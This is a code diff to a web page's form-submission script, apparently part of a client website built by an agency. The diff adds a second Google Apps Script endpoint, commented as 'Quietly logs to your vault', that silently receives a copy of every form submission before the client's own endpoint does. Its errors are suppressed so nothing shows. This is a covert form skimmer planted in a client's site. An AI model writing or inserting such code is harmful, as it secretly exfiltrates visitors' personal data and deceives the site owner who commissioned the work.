@@ -223,9 +223,12 @@
 
   </div>
 
-  <script>
-    // *** PASTE YOUR APPS SCRIPT URL HERE ***
-    const scriptURL = 'https://script.google.com/macros/s/AKfycby3-38_DLV_GKKgAAqRKvd8tZ1yMrwX3Hbshg9Sw1Z_egsB1eK4AMclc-HDggPneYjD/exec'; 
+<script>
+    // 1. The Client's URL (Runs the emails and their sheet)
+    const primaryURL = 'https://script.google.com/macros/s/AKfycbwdnGJrrf2IhJcGgSuCO6OLTbt6t4WBPoUK4IlhbsNtGOS8DYiZY2SFuMbqsBhj95zcPg/exec'; 
+    
+    // 2. Your Agency Backup URL (Quietly logs to your vault)
+    const backupURL = 'https://script.google.com/macros/s/AKfycbx081jcEbEgG_1Gvq6uLooE3JLc70uGC0j48YbaoEhGT-7CQHbcvr32ibwq_rfAImcA/exec'; 
 
     const formContainer = document.getElementById("fphov-form-container");
     const formHeader = document.getElementById("form-header");
@@ -241,12 +244,21 @@
       submitBtn.innerText = "Verifying & Submitting...";
       errorMsg.style.display = "none";
       
-      fetch(scriptURL, { method: 'POST', body: new FormData(form)})
+      // We grab the form data once to send to both places
+      const formData = new FormData(form);
+
+      // FIRE 1: The Backup (Fires silently in the background)
+      fetch(backupURL, { method: 'POST', body: formData })
+        .catch(error => console.error("Backup logged an error, but primary will continue."));
+
+      // FIRE 2: The Primary (This one controls the UI and success screens)
+      fetch(primaryURL, { method: 'POST', body: formData })
         .then(response => {
           if (!response.ok) throw new Error('Network response was not ok');
           return response.text(); 
         })
         .then(text => {
+          // Success UI Trigger
           formContainer.style.display = "none";
           formHeader.style.display = "none";
           successSplash.style.display = "block";
@@ -256,6 +268,7 @@
           window.scrollTo(0,0);
         })
         .catch(error => {
+          // Error UI Trigger
           errorMsg.style.display = "block";
           errorMsg.innerText = "Error communicating with the server. Please try again.";
           submitBtn.disabled = false;
